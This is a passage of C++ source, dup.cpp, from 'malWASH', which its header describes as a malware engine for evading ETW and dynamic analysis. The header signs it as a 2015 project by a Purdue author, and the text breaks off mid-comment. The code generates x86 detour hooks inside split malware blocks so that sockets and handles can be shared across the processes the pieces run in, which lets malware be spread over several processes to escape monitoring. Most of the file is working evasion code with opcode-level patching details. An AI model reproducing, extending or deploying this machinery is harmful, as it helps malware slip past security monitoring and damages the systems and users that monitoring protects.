//-----------------------------------------------------------------------------------------------------------
/*
**                               ,,                                                        
**                             `7MM `7MMF'     A     `7MF' db       .M"""bgd `7MMF'  `7MMF'
**                               MM   `MA     ,MA     ,V  ;MM:     ,MI    "Y   MM      MM  
**  `7MMpMMMb.pMMMb.   ,6"Yb.    MM    VM:   ,VVM:   ,V  ,V^MM.    `MMb.       MM      MM  
**    MM    MM    MM  8)   MM    MM     MM.  M' MM.  M' ,M  `MM      `YMMNq.   MMmmmmmmMM  
**    MM    MM    MM   ,pm9MM    MM     `MM A'  `MM A'  AbmmmqMA   .     `MM   MM      MM  
**    MM    MM    MM  8M   MM    MM      :MM;    :MM;  A'     VML  Mb     dM   MM      MM  
**  .JMML  JMML  JMML.`Moo9^Yo..JMML.     VF      VF .AMA.   .AMMA.P"Ybmmd"  .JMML.  .JMML.
**     
**  malWASH - The malware engine for evading ETW and dynamic analysis: A new dimension in APTs 
**
**  ** The splitting engine ** - Version 2.0
**
**
**  dup.cpp
**
**  This file contains all code needed for sharing SOCKETs and HANDLEs among different processes. Most of 
**  the job is done on executer, but we have to setup the basic structure here.
**
**  The reason that SOCKETs and HANDLEs need special care is because if process A opens a SOCKET/HANDLE, 
**  process B cannot use it. This is a problem because consequtive blocks of the malware will almost 
**  always executed within different processes.
**
**  The idea here is to use functions WSADuplicateSocket() and DuplicateHandle() to duplicate and share
**  HANDLEs/SOCKETs between processes. However we need a special structure and some hooks installed at 
**  the right places, in order to manage all open SOCKETs and HANDLEs. We call this structure "duptab".
**  
**  Now let's try to enumerate the potential types of hooks. We found 8 (eight) possible cases, although
**  might exist more. 
**
**  [1]. SOCKET a(int, ...)            / HANDLE a(int, ...)                 --> IMPLEMENTED
**  [2]. int    b(SOCKET, ...)         / int    b(HANDLE, ...)              --> IMPLEMENTED
**  [3]. SOCKET c(SOCKET, ...)         / HANDLE c(HANDLE, ...)              --> IMPLEMENTED
**  [4]. int    d(SOCKET, SOCKET, ...) / int    d(HANDLE, HANDLE, ...)      --> IMPLEMENTED
**  [5]. SOCKET e(SOCKET, SOCKET, ...) / HANDLE e(HANDLE, HANDLE, ...)      --> NOT IMPLEMENTED
**  [6]. int    f(PHANDLE, ... )                                            --> IMPLEMENTED
**  [7]. int    g(HKEY, ..., PHKEY)                                         --> IMPLEMENTED
**  [8]. int    h(HANDLE, SOCKET, ...) / or any mix with SOCKETs/HANDLEs    --> NOT IMPLEMENTED
**  [9]. HANDLE i(PHANDLE, ... )       / SOCKET i(PSOCKET(!?), ... )        --> NOT IMPLEMENTED
**
**  NOTE 1: HKEY and HANDLE are actually the same thing.
**  NOTE 2: Although SOCKET != HANDLE internally they stored on the same table. Thus it's impossible to
**          have a HANDLE with the same value with a SOCKET. The huge advantage of this is that we can
**          store both of them in the same array.
**  NOTE 3: We'll call any function that uses a SOCKET/HANDLE dup*.
**
**  From the above cases we don't implement [5] and [8] as they're very rare (if not impossible) to 
**  meet in the real wild world of malware.
**
**  We have to take special care for [7]. Note that a HANDLE is still returned but not through return value.
**  A HANDLE pointer argument is used instead. Thus we have to work as in case [3] and not as in [4].
**
**  So, when a SOCKET/HANDLE is returned as an argument or through a pointer, we have to store it in duptab
**  and (not always) inform other processes about the newly created SOCKET/HANDLE. When a SOCKET/HANDLE is
**  used as an argument we have to lookup in duptab and replace it with the right value.
**
**
**  Kyriakos Ispoglou (ispo) - ispo@purdue.edu
**  June - August 2015
*/
//-----------------------------------------------------------------------------------------------------------
#include "malwash.h"                                        // all includes are here


//-----------------------------------------------------------------------------------------------------------
/*
**  crthook(): Create a hook function (detour) to the call/jmp to the imported modules. This function 
**      installs some code before/after the actuall library call to make hooking possible. We don't know the
**      address of the hook function at compile time it must be solved at runtime. The goal of the hook
**      functions is to manipulate the duptab. There are 3 operations in duptab: SELECCT, INSERT, DELETE.
**      By convention in an INSERT operation loc variable of dup_t will have the MSBit of LSByte set.
**      
**      This function can be very complex as there are many different cases that we have to handle (see
**      the function body to understand why)
**
**  NOTE: We can avoid hooks and insert extra code in the middle of block instead. This solution will work
**      when we have a basic block split (as there are no relative jumps within blocks). However if we use 
**      a different splitting mode and each block consist of many basic blocks, this approach won't work.
**
**  Arguments:  blk       (uchar*)     : Block opcodes
**              blkcnt    (uint)       : Block size
**              duptab    (dup_t*)     : A pointer to duptab
**              dupcnt    (uint)       : # of duptab entries
**              funcrel   (funcrel_t*) : A pointer to funcrel
**              funrelcnt (uint)       : # of funcrel entries
**
**  Return Value: Function returns constant ANY. If an error occured, it returns -1.
*/
uint crthook( uchar blk[], uint *blkcnt, dup_t duptab[], uint dupcnt, funcrel_t funcrel[], uint funrelcnt )
{
// redefine these MACROS
#define PBYTE1(b)          (blk[(*blkcnt)++] = (b) & 0xff)  // append a single byte to blk array
#define PLONG(l)           *(uint*)(blk + *blkcnt) = (l); *blkcnt += 4  // append a 4 byte integer to blk array
#define PBYTE2(a, b)       PBYTE1(a); PBYTE1(b)             // append 2 bytes to blk array
#define PBYTE3(a, b, c)    PBYTE2(a, b); PBYTE1(c)          // append 3 bytes to blk array
#define PBYTE4(a, b, c, d) PBYTE3(a, b, c); PBYTE1(d)       // append 4 bytes to blk array
#define SET_EBX(target)    PBYTE1(0xBB); PLONG(target)      // write the instruction mov ebx, _long_

// this MACRO changes a function relocation offset from and old (o) to a new (n) value: 
#define movreloff(o, n)              \
    for(uint i=0; i<funrelcnt; i++ ) \
        if( funcrel[i].boff == (o) ) \
        {                            \
            funcrel[i].boff = (n);   \
            break;                   \
        } 


    ushort  jmpoff = *blkcnt;                               // store current block size
    

    if( dupcnt == 0 ) return SUCCESS;                       // if there's no need for duplications, exit
    
    
    // reserve 5 bytes for adding a relative far jump to skip function definitions.
    // (we can add a relative near jump (1 byte offset) but it's dangerous)
    *blkcnt += 5;

    for(uint d=0; d<dupcnt; d++ )                           // for each entry in duptab
    {   
        bool    indhook = false,                            // flag for indicating indirect hooks
                callreg = false;                            // flag for indicating indirect calls with register
        ushort  hdlptr  = 0;                                // flag for HANDLE pointers
        ushort  imploc,                                     // new offset of call to the imported module
                duprepl,                                    // offset of the (last) unknown hook function
                hookst = *blkcnt;                           // where the hook code starts

        /*  -----------------------------------------------------------------------------------------
        **  The common case is to have call instructions to dup* functions. However, compilers can mess 
        **  things up. Trampoline functions (where we have jmp instead of call instructions) and indirect 
        **  calls (e.g. "call esi") can be found.
        **  We have to identify these cases and setup the right flags.
        */
        if( blk[duptab[d].boff] == 0x8b ||                  // mov reg, __imp__closesocket  
            blk[duptab[d].boff] == 0xa1 )                   // mov eax, __imp__closesocket  
        {
            //
            // In this case we have a call to a dup* function through an indirect way: At first we assign
            // dup*'s function address to a register and then we "call" that register. However we don't
            // know at this point whether the "call reg" instruction follows (because it may be on a 
            // different block. So, we'll assume that a "call reg" instruction follows. Furthermore we 
            // require that between "mov" and "call", the register remain intact; Otherwise we don't know
            // the calling function:
            //      .text:0040136B 8B 35 54 20 40 00    mov     esi, ds:CloseHandle     ; block #1
            //      .text:00401371 ...
            //      .text:00401374 FF D6                call    esi                     ; block #7
            //      .text:00401376 ...
            //
            // In direct function calls/jumps we directly modify the call/jump instruction to point at the
            // end of the block. Now we have some troubles:
            //  [1]. The "call reg" instruction is 2 bytes long. We cannot make a call at the end of the 
            //       block, cause it's 5 bytes. However we can use a 1-byte relative jump, hoping that
            //       the end of the block size will be in less than 128 bytes.
            //  [2]. The obvious problem of [1], can be solved by modifying function address of at the "mov"
            //       instruction. Unfortunately this "call reg" uses an absolute address. We don't know the
            //       exact address of our hook at the end of the block, so we cannot call it.
            //  [3]. Even we're able to determine the exact address at the end of the block, we still have
            //       problems. Let's say that esi gets address of socket() at block 1. We replace it with 
            //       the absolute address of our hook. At block 2 there's the "call esi". At that point the
            //       address of esi will be invalid as long as blocks 1 & 2 get executed under different 
            //       address spaces and under different base addresses.
            //
            //  NOTE1 : Keep in mind that the mov instruction uses INDIRECT values. Thus the value that we
            //          set to esi will be a pointer to the real value and not the real value itself.
            //  NOTE 2: This is a very rare case!
            //
            //
            //  * * * The proposed solution is the following:
            //  [1]. Define function const_detour() at a predefined address. Map this region to all procceses
            //       at the same address.
            //  [2]. Replace dup* function address with the absolute address of const_detour(). Thus we can
            //       transfer control there.
            //  [3]. Now we must somehow jump to the end of the block. We know that we called const_detour() 
            //       from the basic block. Thus, the return address will be somewhere within the block.
            //  [4]. Just before our normal hook we add a unique 4-byte signature.
            //  [5]. From const_detour() we search down for that signature. Once we find it we transfer control
            //       there.
            //  [6]. At the end of the block we have the "classic" code for handling duplicated SOCKETs/HANDLEs
            //
            msg("    [-] Reaching indirect mov with an imported function address.\n" );


            indhook = true;                                 // enable indirect hooks. 
                                                            // Oh yeah that's all we have to do!
        }
        // * * * * * * * * * * * * * * * * * * * *
        else if( blk[duptab[d].boff]     == 0xff &&         // call reg ?
                 blk[duptab[d].boff + 1] >= 0xd0 &&         // where reg, is a register
                 blk[duptab[d].boff + 1] <= 0xd7 )
        {
            //  This is the consequence of the above check. Condition is true when we encounter one of the 
            //  following instructions:
            //      call [eax, edx, ecx, ebx, esi, edi, ebp, esp]
            msg("    [-] Reaching indirect call with register.\n" );


            callreg = true;                                 // enable register calls
        }
        // * * * * * * * * * * * * * * * * * * * *
        else if( blk[duptab[d].boff + 1] != 0x15 &&         // we consider only indirect calls
                 blk[duptab[d].boff + 1] != 0x25 )          // or indirect jumps :)
        {
            //  Maybe it's impossible to enter here
            //  However we add this check for completeness :)
            fatal( "Current version cannot duplicate trampoline HANDLE/SOCKET functions" );
            return ERROR;                                   // abort
        }
    

        /*  -----------------------------------------------------------------------------------------
        **  Now the hard tough... :( We now have to install the right hooks in the right places.
        **  
        **  There are 3 types of operations in the duptab: SELECT, INSERT, DELETE. In the INSERT case,
        **  we have to insert the hook AFTER the call to the dup* function. But on the SELECT and DELETE
        **  cases the hook must be inserted BEFORE the dup* call. Note that some functions (e.g. cases 
        **  [3] and [7] - accept() ) require both a SELECT and an INSERT at the same time. We can achieve 
        **  this by inserting 2 hooks: 1 before function call and 1 after. Some others require 2 SELECT 
        **  operations (e.g CreateFile() ). That's easy we can simply generalize the SELECT operation to
        **  do multiple searches
        */

        //
        // If we have an indirect hook we have to start with a magic 4 byte signature. Because with
        // indirect hooks we transfer control to a constant function we need a way to move from this
        // function back to the hook code inside block (we don't know its runtime address).
        //
        if( indhook || callreg )                        // in indirect hooks start with signature
        {                                   
            PBYTE2( 0xeb, 0x04 );                       // jump 4 bytes ahead (skip signature)
            PLONG(DUPUNIQUESIG);                        // add magic signature
        }

        //
        // These are the 2 main division of our hooks: Whether we'll insert the hook before or after function 
        // call. This is the case where we insert the hook BEFORE function call or BEFORE AND AFTER function
        // call.
        //
        if( (duptab[d].loc & 0xff) == 0 ||                  // duplicate return value
            (duptab[d].loc & 0x80) != 0 )                   // or return value  & argument 
                                                            // or handle poiter & argument?
        {
            //
            // In such cases, we have a call to a function that returns a SOCKET/HANDLE:
            //      .text:0041185C 52                   push    edx
            //      .text:0041185D FF 15 8C A4 41 00    call    ds:__imp__socket@12
            //      .text:00411863 89 85 6C FE FF FF    mov     [ebp+sock], eax
            // 
            // We replace the function call with a nop (1 byte) + a relative jump to hook (5 bytes):
            //      e9 ?? ?? 00 00          jmp   +???? <hook> 
            // (we don't use a call because this will modify the stack and the 1st argument won't be
            //  in esp+4 anymore).
            //
            // We store the hook at the end of the normal basic block. The first job of the hook is
            // to execute the replaced instruction call/jmp.
            // After call, eax will contain the SOCKET/HANDLE value. Then we call a function that is
            // responsible for inserting the handle in the duplicate's table, duplicating it and informing
            // other processes to use the duplicated handle.
            // However we don't know the address of this function and we have to resolve it at runtime.
            // Thus we insert a call but we leave the address empty. Note that this call should return the 
            // original SOCKET/HANDLE value. After this call we jump to the instruction right after the call 
            // to the hook. In the above example, the code will be changed to:
            //
            //      seg000:0000002F 52                    push    edx
            //      seg000:00000030 90                    nop
            //      seg000:00000031 E9 3F 00 00 00        jmp     loc_75
            //      seg000:00000036                   loc_36:
            //      seg000:00000036 89 85 6C FE FF FF     mov     [ebp-194h], eax
            //      ...
            //      seg000:00000075                   loc_75:
            //      seg000:00000075 FF 15 8C A4 41 00     call    dword ptr ds:41A48Ch  ; ds:__imp__socket@12
            //      seg000:0000007B E8 90 90 90 90        call    near ptr 90909110h
            //      seg000:00000080 E9 B1 FF FF FF        jmp     loc_36
            //
            // NOTE: Handling this: jmp  ds:__imp__socket@12. It's tricky. First of all, this jump will 
            //       be the last instruction of a block and thus, will be replaced by a bunch of instructions
            //       from patchblk(). patchblk() will replace the return address with a fake one. We must
            //       add some offset to that return address, because we want to return to the instruction 
            //       below and not to the "return_here" label which is the default return address in indirect 
            //       jumps.
            //
            bool    duparg = false;                         // flag for duplicating an argument except ret. val.


            /*  -----------------------------------------------------------------------------------------
            **  First we set some basic flags to help us later.
            **  It's a bad idea if we start mixing flags with code (I did it in previous version and I
            **  ended up in a buggy and messy code)
            */
            if( UNPACK_2(duptab[d].loc) == DUPPTRHANDLE ||  // duplicate a handle pointer?
                UNPACK_2(duptab[d].loc) == DUPPTRHANDLE_2 ) 
            {
                //
                // At this point we know that we have a HANDLE pointer. This pointer is the only in this
                // function and there's no return value that needs duplication. There's also may be another
                // argument that needs duplication, but our pointer argument is stored in the LSByte of 
                // duptab[d].loc. So we have to handle this argument in the same way as a return value.
                // Let's remember how we duplicate a return value:
                //
                //      seg000:00000075 FF 15 8C A4 41 00     call    dword ptr ds:41A48Ch  ; ds:__imp__socket@12
                //      seg000:0000007B E8 90 90 90 90        call    near ptr 90909110h
                //
                // Here, we call the library function, and then we call the hook function (we don't know 
                // the address at compile time) to INSERT that value in duptab. We know that the SOCKET/
                // HANDLE will be returned in eax. Thus the hook function will get the value from there. If
                // we have a handle pointer the desired SOCKET/HANDLE value will be somewhere in the stack 
                // arguments. We know it's location, so all we have to do is to assign eax with that value.
                // Be careful though because in the stack there'll be the address of the SOCKET/HANDLE and 
                // NOT the actual handle. Also we have to get a backup of the original return value in eax
                //  as the original malware may perform checks with it.
                //
                msg("        [+] Reaching a handle pointer at argument #%d.\n", UNPACK_4(duptab[d].loc) & 0x7f );


                hdlptr = UNPACK_2(duptab[d].loc);           // enable flag: We have an handle pointer
            }
            // * * * * * * * * * * * * * * * * * * * *
            else if( (duptab[d].loc & 0x80) )               // duplicate an argument except the return value?
            {
                //
                // In that case we have both an argument and a return address, so we combine the 2 methods:
                //      .text:00401101 57                   push    edi
                //      .text:00401102 FF 15 20 33 40 00    call    ds:accept
                //      .text:00401108 89 C6                mov     esi, eax
                //
                // The above code becomes:
                //      seg000:0000002D 57                    push    edi
                //      seg000:0000002E 90                    nop
                //      seg000:0000002F E9 44 00 00 00        jmp     loc_78
                //      seg000:00000034                   loc_34:
                //      seg000:00000034 8B F0                 mov     esi, eax
                //      ...
                //      seg000:00000078                   loc_78:
                //      seg000:00000078 8B 44 24 00           mov     eax, [esp+0]
                //      seg000:0000007C E8 90 90 90 90        call    near ptr 90909111h
                //      seg000:00000081 89 44 24 00           mov     [esp+0], eax
                //      seg000:00000085 FF 15 34 61 40 00     call    dword ptr ds:406134h
                //      seg000:0000008B E8 90 90 90 90        call    near ptr 90909120h
                //      seg000:00000090 E9 9F FF FF FF        jmp     loc_34
                //
                msg( "        [+] Creating a hook function for return value and argument #%d at offset %x\n", 
                        duptab[d].loc & 0x7f, duptab[d].boff );
                
                // Oh that's useless!
                duparg = true;                              // enable flag: We also duplicate an argument
            }
            // * * * * * * * * * * * * * * * * * * * *
            else                                            // the simple case. Do nothing 
                msg("        [+] Creating a hook function for return value at offset %d\n", duptab[d].boff);


            /*  -----------------------------------------------------------------------------------------
            **  Now we can install the hooks after having set all flags
            */

            //
            // Firsst we have to to add some code (if needed) BEFORE function call. We'll only do this in 
            // case that we have to duplicate a SOCKET/HANDLE argument (but not a pointer though).
            //
            if( UNPACK_2(duptab[d].loc) != DUPPTRHANDLE_2 &&// if we don't have a HANDLE pointer
                UNPACK_4(duptab[d].loc) & 0x7f )            // and we have an argument
            {
                //
                // The idea here is to replace the  rgument with duplicated one before the actual function 
                // call. eax register should contain the return value, so we can ignore its value. So, we 
                // insert a "mov eax, DWORD PTR [esp+0x?]" (8b 44 24 0?) to read the argument that needs 
                // to be duplicated. 
                // 
                // The location of the argument however may vary. If the original dup* funtion is called 
                // through a "call" instruction then the 1st argument will be at the top of the stack: [esp].
                // But, if the dup* function is called through a trampoline function (a "jmp" instruction) 
                // then the top of the stack will have the return address and the 1st argument will be at 
                // [esp + 4].
                //
                PBYTE4( 0x8B, 0x44, 0x24, ((duptab[d].loc & 0x7f) - 
                                           (blk[duptab[d].boff+1] == 0x25 ? 0:1)) << 2 );
                PBYTE1( 0xe8 );                             // call
                duprepl = *blkcnt;                          // store the offset of function that needs relocation
                PLONG( 0x90909090 );                        // runtime address of locduphdl()
        
                // after call, we replace the argument with the duplicated one: 
                //      "mov DWORD PTR [esp+0x?], eax" (89 44 24 0?)
                PBYTE4( 0x89, 0x44, 0x24, ((duptab[d].loc & 0x7f) - 
                                           (blk[duptab[d].boff+1] == 0x25 ? 0:1)) << 2 );
            }

            //
            // The next thing that we have to fix 1 is the the return address. If we have an indirect
            // jump we have to adjust the return address.
            //              
            if( blk[duptab[d].boff + 1] == 0x25 )       // indirect jump instead of call?
            {
                //
                // Because we have a jmp instruction, the return address will be within the same block. 
                // We want to return to the end of the block (we call this address: fake return address).
                // patckblk() can change return address, but still we must adjust the fake return 
                // address. We want to return at the instruction below jump and not at "return_here" 
                // (see indirect jumps in reloc.cpp->patchblk()). Thus all we have to do is to add some
                // offset to the current return address:                 
                //      83 04 24 ??         add    DWORD PTR [esp], 0x??
                //
                // Calculating the right offset:
                //  Because PBYTE4 is 4 PBYTE1, at the last point, blkcnt will already increased by 3.
                //  The real value is *blkcnt - 3, which points at the beginning of the current instr.
                //  duptab[d].boff - 2 is the beginning of the instruction before detour, +6 to go to the
                //  next instruction. Their difference gives the offset from the original return address 
                //  to the desired one.
                //
                PBYTE4( 0x83, 0x04, 0x24, ((*blkcnt -3)+4+4 - (duptab[d].boff -2 +6)) & 0xff );
            } 
            else { PBYTE4(0x90, 0x90, 0x90, 0x90); }    // otherwise, pad with NOPs to keep offsets constant

            //
            // After that, we must do the actuall call/jump to the dup* function. Also we must redirect 
            // execution to the hook which is at the end of our block. We can do this by replacing the 
            // call/jmp instruction with a jmp at the end of the block. The exception here is the indirect
            // jumps through register (e.g. call esi).
            //
            if( !callreg )                                  // do not relocate in indirect hooks
            {

                /*
                ** TO FIX!!! in mov reg, __imp__
                */ 
                PBYTE2( 0xff, blk[duptab[d].boff+1] );      // set an indirect jump

                if( blk[duptab[d].boff] == 0xff ) {         // in case of a jmp/call

                    blk[duptab[d].boff  ] = 0x90;           // add 1 byte padding
                    blk[duptab[d].boff+1] = 0xe9;           // convert mov to jump + find the offset
                }
                //else 
                //PBYTE2( 0xff, 0x15 );                 // set an indirect jump

                


                imploc = *blkcnt;                           // store offset of imported module
                *blkcnt  += 4;                              // these 4 bytes are for funtime function's address

                // If we have indirect hooks we must transfer control to const_detour(). For example:
                //      mov reg, __imp__closesocket => mov reg, [DUPDETOURADDR]
                // Otherwise we must jump to the beginning of the hook
                *(uint*)(blk + duptab[d].boff + (blk[duptab[d].boff] == 0xa1 ? 1 : 2)) = 
                            !indhook ? hookst - (duptab[d].boff + (blk[duptab[d].boff] == 0xa1 ? 5 : 6)) 
                                     : DUPDETOURADDR;                   
            }
            else {
            
                /* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
                ** TODO: Implement "callreg" when HANDLE/SOCKET is a return value             **
                * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * */

                fatal( "Not implemented yet :(" );
                return ERROR;                               // failure
            }

            //
            // Now the potential handle pointers. In this case we don't want duplicate the return value,
            // which is stored at eax, but an argument. All we have to do is to move the right argument 
            // into eax (don't forget to get a backup of original return value):
            //      87 44 24 f0             xchg   DWORD PTR [esp-0x10],eax 
            //      8b 00                   mov    eax,DWORD PTR [eax]
            //
            // Finding the right argument's offset:
            //  We're right after function return, so argument will be ABOVE stack pointer (we can consider
            //  these variables as "dead" because they are in unused portion of stack and thus they can be 
            //  overwritten any time. So, the top of the stack will be at [esp]. The LAST argument will be
            //  at [esp-4]. The FIRST argument will be at [esp - nargs*4]. Finally the return value will be
            //  at [esp - nargs*4 - 4]. The N-th argument will be at [esp - (nargs - N + 1)*4].
            //
            if( hdlptr )                                    // do we have a handle pointer?
            {
                PBYTE4( 0x87, 0x44, 0x24, -((duptab[d].nargs - UNPACK_3(duptab[d].loc)) << 2) & 0xff );
                PBYTE2( 0x8b, 0x00 );                       // mov eax, [eax]

                if( hdlptr == DUPPTRHANDLE_2 )              // if we have 2 pointer arguments
                {
                    // we do the same for ebx and we call crtduphandle2(), which calls crtduphandle() twice.
                    //      87 5c 24 f0             xchg   DWORD PTR [esp-0x10],ebx
                    //      8b 1b                   mov    ebx, DWORD PTR [ebx]
                    PBYTE4( 0x87, 0x5c, 0x24, -(((duptab[d].nargs - UNPACK_4(duptab[d].loc) & 0x7f)) << 2) & 0xff );
                    PBYTE2( 0x8b, 0x1b );                   // mov ebx, [ebx]
                }

                // We stored the original value of eax (and ebx maybe) at [esp-??], which are in "dead" memory.
                // This means that the call to crtduphandle() will overwritte them. To avoid that, we adjust esp
                // to include all these ex-arguments:
                PBYTE3( 0x83, 0xec, duptab[d].nargs << 2 );                     // sub esp,0x?? (83 ec ??)
            }

            PBYTE1( 0xe8 );                                 // Now we add the call to crtduphandle/crtdupsock
            duprepl = *blkcnt;                              // store the offset of function that needs relocation
            PLONG( 0x90909090 );                            // we can use this space to store info
                                                            
            if( hdlptr ) {                                  // we have to restore original return value if needed

                // first of all adjust esp
                PBYTE3( 0x83, 0xc4, duptab[d].nargs << 2 );                     // add esp,0x?? (83 c4 ??)

                // Now we restore the argument from the "dead" memory:
                //      8b 44 24 fc             mov    ebx, DWORD PTR [esp-0x4]
                PBYTE4(0x8b, 0x44, 0x24, -((duptab[d].nargs - UNPACK_3(duptab[d].loc)) << 2)  & 0xff);


                if( hdlptr == DUPPTRHANDLE_2 )              // if we have 2 pointer arguments
                {
                    // restore original value of ebx 
                    //      8b 5c 24 f8             mov    ebx, DWORD PTR [esp-0x8]
                    PBYTE4(0x8b, 0x5c, 0x24, -((duptab[d].nargs - UNPACK_4(duptab[d].loc)) << 2)  & 0xff);          
                }
            }

            //
            // The last job is to return back from hook. We must return to the point within the original
            // block. If we reached this point through a call "reg" instruction all we have to do, is to
            // simply add a return instruction. Otherwise we must jump back to the instruction after the
            // jmp that brought us here (to the hook code).
            //
            if( callreg ) PBYTE1( 0xc3 );                   // we already have the return address
            else 
            {
                PBYTE1( 0xe9 );                             // jump back to the instruction after hook
                PLONG(-(int)(*blkcnt - duptab[d].boff -2)); // calculate offset
            }
        }
        else                                                // duplicate an argument? 
        {
            //
            // Now, we have a call/jmp to a function that takes a SOCKET/HANDLE as argument:
            //      .text:00411883 51                   push    ecx
            //      .text:00411884 FF 15 88 A4 41 00    call    ds:__imp__connect@12
            //      .text:0041188A 83 F8 FF             cmp     eax, 0FFFFFFFFh
            //
            // We replace the function call with a nop (1 byte) + a relative call to hook (5 bytes):
            //      e8 ?? ?? 00 00          call   +???? <hook> 
            //
            // This time, the first job of the hook, is to read the argument that needs to be duplicated 
            // and call a function from dup* family to find the right duplicated SOCKET/HANDLE for this 
            // process. Then we have to replace the original argument with the duplicated one.
            // Finally we jump to the imported module (instead of call). Once we execute a "retn" inside
            // the imported module, we'll return to the instruction after the call. Let's see how the above
            // example becomes:
            //
            //      seg000:00000056 51                    push    ecx
            //      seg000:00000057 90                    nop
            //      seg000:00000058 E8 28 00 00 00        call    sub_85
            //      seg000:0000005D 83 F8 FF              cmp     eax, 0FFFFFFFFh
            //      ...
            //      seg000:00000085                   sub_85 proc near
            //      seg000:00000085 8B 44 24 04           mov     eax, [esp + 0x04] 
            //      seg000:00000089 E8 90 90 90 90        call    near ptr 9090911Eh
            //      seg000:0000008E 89 44 24 04           mov     [esp + 0x04], eax 
            //      seg000:00000092 FF 25 88 A4 41 00     jmp     dword ptr ds:41A488h ; ds:__imp__connect@12
            //
            //  If we want to replace 2 arguments we can easily generalize this method:
            //      seg000:0000008D 90                    nop
            //      seg000:0000008E E8 12 00 00 00        call    sub_A5
            //      seg000:00000093 3B F4                 cmp     esi, esp
            //      ...
            //      seg000:000000A5 8B 44 24 04           mov     eax, [esp+arg_0]
            //      seg000:000000A9 87 5C 24 08           xchg    ebx, [esp+arg_4]
            //      seg000:000000AD E8 90 90 90 90        call    near ptr 90909142h
            //      seg000:000000B2 89 44 24 04           mov     [esp+arg_0], eax
            //      seg000:000000B6 87 5C 24 08           xchg    ebx, [esp+arg_4]
            //      seg000:000000BA FF 25 68 C2 42 00     jmp     dword ptr ds:42C268h
            //
            //  In this case we use both eax and ebx to store the arguments. However we have to call a different
            //  function (not locduphdl(), which replaces eax only). The new function will call locduphdl() twice
            //  and will return the right value to eax and ebx respectively. We can easily generalize this method
            //  to duplicate >2 arguments. However it's very rare to meet such cases, so we'll only use the simple 
            //  method here.
            //
            //  If we have indirect jump instead (jmp ds:__imp__connect@12), all we have to do, is to replace the
            //  first call (call sub_85) with a jump (jmp sub_85). However we have to take care of 1 more thing.
            //  In case of jump, the return address will be at the top of the stack, so the 1st argument will be
            //  at [esp + 4] and not at [esp].
            //
            //  NOTE 1: We can eax without taking a backup. During a function call, eax will have the return value,
            //          so eax is not important before function call (library functions use __cdelc or __stdcall, 
            //          thus it's impossible to pass arguments through eax).
            //

            msg( "        [+] Creating a hook function for argument #%d (and maybe for #%d) at offset %d\n", 
                    UNPACK_4(duptab[d].loc), UNPACK_3(duptab[d].loc), duptab[d].boff);


            // First we insert a: "mov eax, DWORD PTR [esp + 0x??]" (8b 44 24 ??) to read thea argument that
            // needs to be duplicated, where ?? is the argument location*4
            PBYTE4( 0x8B, 0x44, 0x24, UNPACK_4(duptab[d].loc) << 2 );

            if( UNPACK_1(duptab[d].loc) == DUPHANDLE2 || UNPACK_1(duptab[d].loc) == DUPSOCK2 ) 
            {
                // In this case, we have 2 arguments. Use also ebx register (don't forget to get a backup):
                //  "xchg DWORD PTR [esp + 0x??], ebx" (87 5c 24 ??)
                PBYTE4( 0x87, 0x5c, 0x24, UNPACK_3(duptab[d].loc) << 2 );
            }
        
            PBYTE1( 0xe8 );                                 // add the dup* call
            duprepl = *blkcnt;                              // get offset of dup* function call
            PLONG( 0x90909090 );                            // we can use this space to store info
        
            if( UNPACK_1(duptab[d].loc) == DUPHANDLE2 || UNPACK_1(duptab[d].loc) == DUPSOCK2 ) 
            {
                // restore ebx and patch the duplicataed argument in 1 step :)
                PBYTE4( 0x87, 0x5c, 0x24, UNPACK_3(duptab[d].loc) << 2 );
            }

            // after call, replace the argument with the duplicated one: 
            //   "mov DWORD PTR [esp+0x?], eax" (89 44 24 0?)
            PBYTE4( 0x89, 0x44, 0x24, (duptab[d].loc & 0xff) << 2 );


            // now we have to prepare the jump to library call
            PBYTE2( 0xff, 0x25 );                   // this is a "jmp __imp__func" (at least the first part)

            //
            // Finally, it's time for the actual call/jump. Because we don't want to add any code after 
            // thiscall, things are easy. In case of call/jump we simply copy the bytes. In case of a 
            // mov we replace it with a call, because we ASSUME that after the "mov reg, __imp__??" a
            // "call reg" follows and not a "push retaddr; jmp reg"
            //
            if( !callreg )                                  // do not relocate in indirect hooks
            {
                //
                // Convert call to jump (indirect jump and indirect call differ only in 2nd byte):
                //      FF 25 B8 A3 41 00    jmp     ds:__imp__memset
                //      FF 15 88 A4 41 00    call    ds:__imp__connect@12
                //      8B 35 88 A4 41 00    mov     esi, ds:__imp__connect@12
                //
                if( blk[duptab[d].boff] == 0xff ) {         // in case of 5 the yte mov instruction
            
                    blk[ duptab[d].boff ] = 0x90;           // add 1 byte padding
                    blk[duptab[d].boff+1] = blk[duptab[d].boff + 1] == 0x15 ?                           
                                            0xe8 :          // if we have an indirect call, then use call (0xe8)
                                            0xe9;           // otherwise use an indirect jump (0xe9) 
                }

                // If we have indirect hooks we must transfer control to const_detour(). For example:
                //      mov reg, __imp__closesocket => mov reg, [DUPDETOURADDR]
                // Otherwise we must jump to the beginning of the hook
                *(uint*)(blk + duptab[d].boff + (blk[duptab[d].boff] == 0xa1 ? 1 : 2)) = 
                            !indhook ? hookst - (duptab[d].boff + (blk[duptab[d].boff] == 0xa1 ? 5 : 6)) 
                                     : DUPDETOURADDR;                   
            }

            imploc = *blkcnt;                               // store offset of imported module
            *blkcnt += 4;                                   // these 4 bytes are for funtime function's address
        }
            
        // because we moved a call to an imported module, we have to update the offset in funcrel
        // table. Otherwise we'll try to relocate a function at the wrong offset
        movreloff(duptab[d].boff + (blk[duptab[d].boff] == 0xa1 ? 1 : 2), imploc);

        duptab[d].boff = duprepl;                           // boff now points to unknown dup* function 
    }

    // we insert hooks at the end of basic block. We have to finish basic block with a jump to skip hooks:
    blk[ jmpoff ] = 0xe9;                                   // jump
    *(uint*)(blk + jmpoff + 1) = (*blkcnt - jmpoff - 5);    // find offset (5 = jump size)

    return SUCCESS;                                         // return

#undef PBYTE4                                               // undefine MACROS
#undef PBYTE3
#undef PBYTE2
#undef PLONG
#undef PBYTE1
}
//-----------------------------------------------------------------------------------------------------------
/*
**  dupchk(): This function checks whether an imported function from a module uses a SOCKET or a HANDLE. 
**      Because subsequent blocks of the splitted program will be in different processes, we'll have 
**      troubles. If process 1 open a socket, then process 2 cannot write to it. Fortunately, functions
**      WSADuplicateSocket() and DuplicateHandle() can solve this problem.
**      IDA helps us for one more time. When we have a call/jmp to an imported module, the first data xref
